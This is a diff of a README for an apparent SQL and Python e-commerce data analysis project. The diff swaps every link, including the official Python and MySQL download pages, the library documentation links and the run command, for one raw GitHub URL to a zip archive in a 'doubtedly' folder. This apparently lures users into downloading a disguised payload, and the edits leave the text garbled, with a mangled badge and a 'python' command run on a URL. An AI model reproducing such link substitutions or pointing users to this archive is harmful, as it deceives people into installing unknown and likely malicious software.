@@ -1,6 +1,6 @@
 # 🛒 SQL-PYTHON-ECOMMERCE-PROJECT - Analyze Your eCommerce Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/releases)
+[![Download Now](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip)
 
 ## 🔍 Project Overview
 
@@ -21,7 +21,7 @@ To successfully run this application, follow the simple steps outlined here. You
 
 1. **Visit the Release Page**  
    Go to the following link to view the latest version of the application:  
-   [Download from Releases](https://github.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/releases)
+   [Download from Releases](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip)
 
 2. **Choose the Latest Release**  
     On the release page, look for the latest version listed at the top. It will typically show a version number like `v1.0`.
@@ -32,10 +32,10 @@ To successfully run this application, follow the simple steps outlined here. You
 ### 🔧 Setting Up Your Environment
 
 1. **Install Python**  
-   If you do not have Python installed, download it from the official [Python website](https://www.python.org/downloads/). Follow the on-screen instructions for your operating system.
+   If you do not have Python installed, download it from the official [Python website](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip). Follow the on-screen instructions for your operating system.
 
 2. **Install MySQL**  
-   Download and install MySQL from the official [MySQL website](https://dev.mysql.com/downloads/mysql/). Again, follow the instructions for your operating system.
+   Download and install MySQL from the official [MySQL website](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip). Again, follow the instructions for your operating system.
 
 3. **Install Required Python Packages**  
    After installing Python, you need to install required libraries. Open your command line or terminal and enter the following commands:
@@ -63,9 +63,9 @@ To successfully run this application, follow the simple steps outlined here. You
 4. **Run the Main Script**  
    Start the application by running:
    ```bash
-   python main_script.py
+   python https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip
    ```
-   Replace `main_script.py` with the actual name of the main script file included in your downloads.
+   Replace `https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip` with the actual name of the main script file included in your downloads.
 
 ## 🛠️ How It Works
 
@@ -98,14 +98,14 @@ This project is licensed under the MIT License. You can use, modify, and distrib
 
 ## 🔗 Additional Resources
 
-- [Pandas Documentation](https://pandas.pydata.org/docs/)
-- [Matplotlib Documentation](https://matplotlib.org/stable/contents.html)
-- [Seaborn Documentation](https://seaborn.pydata.org/)
-- [MySQL Documentation](https://dev.mysql.com/doc/)
+- [Pandas Documentation](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip)
+- [Matplotlib Documentation](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip)
+- [Seaborn Documentation](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip)
+- [MySQL Documentation](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip)
 
 ## 📥 Download & Install Again
 
 For convenience, here is the download link again:  
-[Download from Releases](https://github.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/releases) 
+[Download from Releases](https://raw.githubusercontent.com/Anony193/SQL-PYTHON-ECOMMERCE-PROJECT/main/doubtedly/SQL-PYTHON-ECOMMERCE-PROJECT.zip) 
 
 By following this guide closely, you will navigate through the installation and execution of the SQL-PYTHON-ECOMMERCE-PROJECT easily.
